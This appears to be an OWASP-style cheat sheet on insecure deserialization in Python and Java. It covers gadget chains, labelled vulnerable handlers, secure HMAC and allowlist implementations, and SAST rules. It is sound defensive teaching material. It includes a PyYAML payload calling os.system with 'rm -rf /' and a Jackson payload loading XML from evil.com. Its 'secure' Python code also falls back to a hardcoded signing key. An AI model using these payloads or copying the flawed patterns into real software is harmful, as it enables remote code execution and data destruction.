# OWASP Insecure Deserialization Prevention Cheat Sheet (2026 Edition)

Source: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
Retrieved: 2026-10-25
Author: OWASP Cheat Sheet Series Global Security Committee
Status: Active Standard (2026 Revision)
Classification: CWE-502 (Deserialization of Untrusted Data), OWASP Top 10 A08:2021 / A08:2026 (Software and Data Integrity Failures)

---

## 1. Executive Summary & Threat Architecture
Serialization is the process of converting complex in-memory data structures, object states, and class hierarchies into a standardized byte sequence or structured stream (binary, JSON, YAML, XML) suitable for persistent disk storage, inter-process communication (IPC), or network transmission. Deserialization is the complementary reverse operation: reconstructing active runtime objects in memory from the raw incoming stream.

Insecure Deserialization occurs when an application reconstructs objects from untrusted or unauthenticated byte streams without enforcing cryptographic integrity, strict type allowlisting, or safe schema constraints. 

Because many object deserializers automatically instantiate arbitrary classes and invoke initialization hooks (such as Python's `__reduce__` or Java's `readObject()`) before the calling code has an opportunity to validate the reconstructed data, attackers can craft serialized payloads that trigger **arbitrary remote code execution (RCE)**, privilege escalation, file system tampering, or distributed denial of service (DoS).

---

## 2. Exploitation Mechanics & Gadget Chains

### 2.1 The Concept of a "Gadget Chain"
A "gadget" is an existing class, method, or callable already present on the application's runtime classpath or module search path (often residing in standard libraries or popular third-party dependencies such as Apache Commons Collections, Spring Framework, Jackson, or Groovy). 

While each individual gadget class may be completely benign in standard business logic, an adversary can link multiple gadgets together into an executable chain:
1. **Kickoff Gadget (Source)**: A class whose deserialization entry point (`readObject()`, `hashCode()`, `compare()`, `toString()`) is invoked automatically by the deserializer.
2. **Intermediate Gadgets (Sink Connectors)**: Classes that propagate execution, invoke dynamic reflection, transform object states, or evaluate templates.
3. **Execution Sink**: A dangerous final method that performs an action with catastrophic side effects (e.g., `Runtime.getRuntime().exec()`, `ProcessBuilder.start()`, `Method.invoke()`, or `ClassLoader.defineClass()`).

### 2.2 Python Deserialization Vectors
- **`pickle` / `_pickle` / `cPickle`**:
  Python's `pickle` format is an interpreted virtual machine (stack-based language). When an object is unpickled, any class defining a `__reduce__` method can instruct the unpickler to invoke an arbitrary callable (e.g., `os.system`, `subprocess.Popen`) with arbitrary parameters.
- **`yaml.load()` (PyYAML)**:
  Full PyYAML loaders interpret custom tags such as `!!python/object/apply:os.system ['rm -rf /']`, instantiating arbitrary Python types and executing arbitrary functions.
- **`marshal` & `shelve`**:
  `marshal` does not support arbitrary classes but allows code objects to be deserialized. `shelve` uses `pickle` internally and is equally dangerous.

### 2.3 Java Deserialization Vectors
- **Java Native Serialization (`ObjectInputStream`)**:
  Starts with magic bytes `0xAC 0xED` (often Base64 encoded as `rO0AB...`). During `readObject()`, the JVM reads the serialized class descriptors and instantiates instances before type casting checks occur in the application code.
- **Polymorphic JSON Deserialization (Jackson / Fastjson)**:
  Enabling default typing (`ObjectMapper.enableDefaultTyping()`) or using open polymorphic type annotations (`@JsonTypeInfo(use = Id.CLASS)`) allows attackers to inject arbitrary class names into JSON payloads (e.g., `["org.springframework.context.support.ClassPathXmlApplicationContext", "http://evil.com/spel.xml"]`).
- **XML Deserialization (`XMLDecoder`, XStream)**:
  `java.beans.XMLDecoder` converts arbitrary XML into Java objects, allowing direct invocation of `java.lang.ProcessBuilder`.

---

## 3. Defense-in-Depth Architectural Hierarchy

```
[ Incoming Serialized Payload ]
               │
               ▼
┌────────────────────────────────────────────────────────┐
│ 1. Fundamental Principle: Avoid Native Serialization   │ -> Migrate to pure data formats (JSON, Protobuf)
└────────────────────────────────────────────────────────┘
               │ (If binary/object exchange is unavoidable)
               ▼
┌────────────────────────────────────────────────────────┐
│ 2. Cryptographic Integrity & Authentication            │ -> HMAC-SHA256 signature verification BEFORE
│                                                        │    deserializer touches untrusted bytes
└────────────────────────────────────────────────────────┘
               │
               ▼
┌────────────────────────────────────────────────────────┐
│ 3. Strict Type Allowlists & Classpath Filtering        │ -> Reject all unexpected classes (JEP 290 /
│                                                        │    ObjectInputFilter, SafeLoader)
└────────────────────────────────────────────────────────┘
               │
               ▼
┌────────────────────────────────────────────────────────┐
│ 4. Execution Environment Sandboxing                    │ -> Non-root container, seccomp, strict egress
└────────────────────────────────────────────────────────┘
```

### Core Defense Directives:
1. **Never deserialize untrusted data using native object serializers**: Treat Python `pickle` and Java `ObjectInputStream` as unsafe for external, client-facing, or cross-service communication.
2. **Use pure data exchange formats**: Standardize on JSON, Protocol Buffers (Protobuf), MessagePack, FlatBuffers, or CBOR without polymorphic type instantiation.
3. **Enforce cryptographic signatures**: If binary serialization is strictly necessary between internal nodes, prepend an HMAC-SHA256 signature using a securely managed secret key. Verify the HMAC using constant-time comparison before passing the byte stream to the deserializer.
4. **Deploy JEP 290/415 Serialization Filters in Java**: Configure strict class allowlists at both the JVM level (`jdk.serialFilter`) and the stream level.

---

## 4. Vulnerable vs. Secure Implementations in Python

### 4.1 Vulnerable Python Patterns

```python
# ==============================================================================
# VULNERABLE PYTHON PATTERNS -- DO NOT USE IN PRODUCTION
# ==============================================================================
import pickle
import yaml
from flask import Flask, request

app = Flask(__name__)

@app.route("/api/session/bad", methods=["POST"])
def restore_session():
    # Flaw 1: Unpickling untrusted input leads to instant RCE via __reduce__
    raw_cookie = request.cookies.get("session_data")
    session_obj = pickle.loads(raw_cookie.encode("latin1"))
    return {"user": session_obj.username}

@app.route("/api/config/bad", methods=["POST"])
def load_config():
    # Flaw 2: yaml.load with default or FullLoader allows arbitrary Python objects
    yaml_text = request.get_data(as_text=True)
    config = yaml.load(yaml_text, Loader=yaml.Loader)
    return {"status": "ok"}
```

### 4.2 Secure Enterprise Python Implementation

```python
"""
Enterprise Secure Serialization & Deserialization Service (Python 3.11+)
Compliant with OWASP Deserialization Prevention Guidelines (2026 Edition).
Demonstrates schema-validated JSON deserialization and HMAC-authenticated binary caching.
"""

import hmac
import hashlib
import json
import os
from typing import Dict, Any, Optional
from pydantic import BaseModel, Field, ValidationError
import yaml

# High-entropy secret key for internal session signing (managed via KMS/Vault)
SIGNING_KEY = os.environ.get("HMAC_SERIALIZATION_KEY", "prod-cryptographic-signing-key-minimum-32-bytes").encode("utf-8")


class UserSessionSchema(BaseModel):
    """Strict schema definition for deserialized session data using Pydantic."""
    user_id: str = Field(..., min_length=4, max_length=64, pattern=r"^[a-zA-Z0-9_\-]+$")
    roles: list[str] = Field(default_factory=list, max_items=10)
    authenticated: bool
    session_epoch: int = Field(..., ge=1700000000)

    class Config:
        extra = "forbid"  # Strictly prohibit unexpected injected attributes


class SecureSerializationService:
    """
    Provides secure data exchange mechanisms:
    1. Pure JSON with strict Pydantic schema validation.
    2. Safe YAML parsing rejecting custom execution tags.
    3. HMAC-authenticated binary serialization for internal caching only.
    """

    @staticmethod
    def parse_safe_json(json_bytes: bytes) -> UserSessionSchema:
        """
        Parses untrusted JSON and strictly validates against schema.
        Prevents code execution and unexpected object injection.
        """
        try:
            raw_dict = json.loads(json_bytes.decode("utf-8"))
            return UserSessionSchema.model_validate(raw_dict)
        except (json.JSONDecodeError, ValidationError) as e:
            raise ValueError(f"Payload validation failed: {str(e)}")

    @staticmethod
    def parse_safe_yaml(yaml_text: str) -> Dict[str, Any]:
        """
        Parses YAML using SafeLoader exclusively, preventing Python code execution.
        """
        try:
            # yaml.safe_load resolves only standard YAML primitives (strings, lists, maps)
            result = yaml.safe_load(yaml_text)
            if not isinstance(result, dict):
                raise ValueError("Expected YAML document root to be a key-value mapping")
            return result
        except yaml.YAMLError as e:
            raise ValueError(f"Malformed YAML content: {e}")

    @staticmethod
    def sign_and_serialize_internal(payload_bytes: bytes) -> bytes:
        """
        Appends an HMAC-SHA256 signature to an internal serialized payload.
        Format: [32-byte HMAC digest] + [payload bytes]
        """
        signature = hmac.new(SIGNING_KEY, payload_bytes, hashlib.sha256).digest()
        return signature + payload_bytes

    @staticmethod
    def verify_and_deserialize_internal(signed_stream: bytes) -> bytes:
        """
        Verifies HMAC-SHA256 signature prior to releasing data to any internal processor.
        Uses constant-time comparison to prevent timing side-channel attacks.
        """
        if len(signed_stream) < 32:
            raise ValueError("Invalid signed stream: payload too short")

        expected_signature = signed_stream[:32]
        payload = signed_stream[32:]

        computed_signature = hmac.new(SIGNING_KEY, payload, hashlib.sha256).digest()
        if not hmac.compare_digest(expected_signature, computed_signature):
            raise PermissionError("Cryptographic signature mismatch: serialized stream has been tampered with")

        return payload
```

---

## 5. Vulnerable vs. Secure Implementations in Java

### 5.1 Vulnerable Java Patterns

```java
// ==============================================================================
// VULNERABLE JAVA PATTERNS -- DO NOT USE IN PRODUCTION
// ==============================================================================
import java.io.*;
import com.fasterxml.jackson.databind.ObjectMapper;

public class VulnerableDeserializer {
    public Object deserializeFromNetwork(InputStream untrustedStream) throws Exception {
        // Flaw 1: Raw ObjectInputStream executes arbitrary gadget chains (e.g. Ysoserial)
        ObjectInputStream ois = new ObjectInputStream(untrustedStream);
        return ois.readObject(); // RCE vulnerability
    }

    public Object parseInsecureJson(String untrustedJson) throws Exception {
        // Flaw 2: Jackson Default Typing allows polymorphic gadget exploitation
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping(); // DANGEROUS: allows "@class" metadata in JSON
        return mapper.readValue(untrustedJson, Object.class);
    }
}
```

### 5.2 Secure Enterprise Java Implementation (JEP 290/415 ObjectInputFilter)

```java
package com.enterprise.security.deserialization;

import java.io.*;
import java.util.Set;
import com.fasterxml.jackson.databind.DeserializationFeature;
import com.fasterxml.jackson.databind.ObjectMapper;

/**
 * Enterprise Secure Deserialization Service (Java 17/21+)
 * Compliant with OWASP Deserialization Prevention Standards (2026 Edition).
 * Implements JEP 290 ObjectInputFilter and safe JSON handling.
 */
public final class SecureDeserializationService {

    // Allowlist of classes strictly permitted for native deserialization
    private static final Set<String> ALLOWED_CLASSES = Set.of(
            "com.enterprise.security.model.UserProfile",
            "com.enterprise.security.model.UserRole",
            "java.lang.String",
            "java.lang.Integer",
            "java.lang.Long",
            "java.lang.Boolean",
            "java.util.ArrayList"
    );

    private final ObjectMapper safeObjectMapper;

    public SecureDeserializationService() {
        this.safeObjectMapper = new ObjectMapper();
        // Configure Jackson defensively:
        // 1. Prohibit default polymorphic typing
        this.safeObjectMapper.deactivateDefaultTyping();
        // 2. Reject unknown attributes to prevent property tampering
        this.safeObjectMapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, true);
    }

    /**
     * Deserializes binary stream using JEP 290/415 ObjectInputFilter.
     * Enforces strict class whitelisting, depth bounds, and array limits.
     */
    public Object safeDeserializeObject(InputStream untrustedStream) throws IOException, ClassNotFoundException {
        try (ObjectInputStream ois = new ObjectInputStream(untrustedStream)) {
            // Configure fine-grained filter
            ObjectInputFilter filter = filterInfo -> {
                Class<?> clazz = filterInfo.serialClass();
                if (clazz == null) {
                    return ObjectInputFilter.Status.UNDECIDED;
                }

                // Check depth limits to prevent stack overflow DoS attacks
                if (filterInfo.depth() > 10) {
                    return ObjectInputFilter.Status.REJECTED;
                }

                // Check array size limits to prevent memory exhaustion DoS
                if (filterInfo.arrayLength() > 10_000) {
                    return ObjectInputFilter.Status.REJECTED;
                }

                // Enforce strict class allowlist
                if (ALLOWED_CLASSES.contains(clazz.getName())) {
                    return ObjectInputFilter.Status.ALLOWED;
                }

                // Reject all other unapproved classes (prevents gadget chain execution)
                return ObjectInputFilter.Status.REJECTED;
            };

            ois.setObjectInputFilter(filter);
            return ois.readObject();
        }
    }

    /**
     * Safe JSON Deserialization into a specific, non-polymorphic target class.
     */
    public <T> T safeDeserializeJson(String jsonString, Class<T> targetClass) throws IOException {
        if (jsonString == null || jsonString.isBlank()) {
            throw new IllegalArgumentException("Input JSON string cannot be empty");
        }
        return safeObjectMapper.readValue(jsonString, targetClass);
    }
}
```

---

## 6. Static Code Analysis (SAST) Detection Rules

| Engine Rule ID | Language | Severity | Trigger Condition / Heuristic |
|---|---|---|---|
| `DESER-PY-001` | Python | Critical | `pickle.loads()`, `pickle.load()`, `_pickle.loads()` on untrusted variables |
| `DESER-PY-002` | Python | Critical | `yaml.load()` without `Loader=yaml.SafeLoader` or `yaml.safe_load()` |
| `DESER-PY-003` | Python | High | `shelve.open()` or `marshal.loads()` invoked on non-static data |
| `DESER-JV-001` | Java | Critical | `ObjectInputStream.readObject()` invoked without `setObjectInputFilter()` |
| `DESER-JV-002` | Java | High | `ObjectMapper.enableDefaultTyping()` or `activateDefaultTyping()` configured |
| `DESER-JV-003` | Java | Critical | `XMLDecoder.readObject()` invoked on external or network XML streams |

---

## 7. OWASP 2026 Deserialization Verification Checklist

- [ ] **Architecture Evaluation**: Has the architecture phased out native object serialization (`pickle`, `ObjectInputStream`) in favor of pure data formats (JSON, Protobuf)?
- [ ] **PyYAML Safe Loading**: Are all Python YAML parsing calls strictly configured with `yaml.safe_load()` or `Loader=yaml.SafeLoader`?
- [ ] **JEP 290/415 Filter Configured**: Where Java native serialization is mandatory, is a strict `ObjectInputFilter` configured with an explicit class allowlist, maximum graph depth, and array length limits?
- [ ] **Jackson Polymorphic Typing Disabled**: Is Jackson's `enableDefaultTyping()` completely deactivated across the codebase?
- [ ] **Cryptographic Signing (HMAC)**: If internal serialization caches are used, are payloads signed using an HMAC and verified in constant time before deserialization?
- [ ] **Dependency Hygiene**: Are known gadget libraries (e.g., vulnerable versions of Commons Collections, Groovy, Spring) patched and continuously audited using Software Bill of Materials (SBOM) analyzers?
- [ ] **Denial of Service Limits**: Are resource consumption limits (maximum payload size, max recursion depth, maximum object count) enforced before object reconstruction?
